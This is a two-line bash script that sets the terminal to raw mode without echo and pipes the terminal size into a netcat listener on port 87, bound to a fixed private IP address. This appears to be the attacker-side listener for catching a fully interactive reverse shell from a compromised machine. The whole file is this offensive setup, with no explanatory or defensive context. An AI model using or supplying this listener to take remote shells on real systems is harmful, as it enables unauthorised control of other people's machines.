
#! /usr/bin/bash

stty raw -echo; (stty size; cat) | nc -lnvp 87 -s  172.18.186.73

